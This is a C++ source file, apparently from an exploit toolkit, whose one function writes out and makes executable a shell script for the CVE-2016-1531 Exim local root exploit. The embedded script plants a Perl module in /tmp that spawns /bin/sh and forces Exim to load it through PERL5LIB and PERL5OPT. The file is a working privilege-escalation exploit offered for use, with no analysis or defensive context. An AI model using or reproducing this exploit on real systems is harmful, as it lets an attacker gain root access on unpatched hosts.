#include <iostream>
#include <fstream>
void exim_payload(void)
{
	std::string exim_exploit = "#!/bin/sh\n"
	"# CVE-2016-1531 exim <= 4.84-3 local root exploit\n"
	"# ===============================================\n"
	"# you can write files as root or force a perl module to\n"
	"# load by manipulating the perl environment and running\n"
	"# exim with the \"perl_startup\" arguement -ps. \n"
	"#\n"
	"# e.g.\n"
	"# [fantastic@localhost tmp]$ ./cve-2016-1531.sh \n"
	"# [ CVE-2016-1531 local root exploit\n"
	"# sh-4.3# id\n"
	"# uid=0(root) gid=1000(fantastic) groups=1000(fantastic)\n"
	"# \n"
	"# -- Hacker Fantastic \n"
	"echo [ CVE-2016-1531 local root exploit\n"
	"cat > /tmp/root.pm << EOF\n"
	"package root;\n"
	"use strict;\n"
	"use warnings;\n"
	""
	"system(\"/bin/sh\");\n"
	"EOF\n"
	"PERL5LIB=/tmp PERL5OPT=-Mroot /usr/exim/bin/exim -ps\n";


    putchar('\n');
    std::cout << "     ~  CVE-2016-1531 Exim <= 4.84-3 Local Root Exploit  ~" << std::endl;
    putchar('\n');
    std::string answer;
    std::cout << "Are you sure you want to continue? [Y/N]\n> ";
    std::cin >> answer;
    if (answer == "Y" || answer == "y" || answer == "Yes" || answer == "yes")
    {

        std::ofstream exim_exploit_file{"CVE-2016-1531-exim.sh"};
	    exim_exploit_file << exim_exploit;
        system("chmod +x CVE-2016-1531-exim.sh");
	    std::cout << "Successfully created exploit" << std::endl;

    }
    else
    {
        exit(EXIT_SUCCESS);
    }
        




}
